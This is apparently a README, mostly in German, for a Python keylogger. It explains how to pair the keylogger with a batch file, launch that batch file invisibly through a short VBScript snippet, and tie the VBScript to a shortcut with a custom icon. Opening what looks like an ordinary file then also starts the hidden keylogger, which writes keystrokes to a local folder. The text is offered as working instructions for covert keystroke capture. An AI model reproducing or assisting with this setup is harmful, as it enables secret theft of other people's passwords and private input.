# Pykeylogger
Pykeylogger in kombination mit cmd file zum gleichzeitigen öffnen von files und des keyloggers


change  file path ("c:/keystrokes/") to your prefered path to save the keystroke text file  
change the two paths in
programm als .bat datei abspeichern

danach vbs program integrieren damit die bat datei unsichtbar gestartet werden kann 

Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "C:\(bat datei zum öffnen der zwei programme)batchconnect.bat" & Chr(34), 0
Set WshShell = Nothing

c pfad durch bat datei pfad ersetzen und als .vbs abspeichern

dann .vbs datei mit icon verbinden unter eigenschaften verknüpfung und dann vbs datei pfad in ziel einspeichern
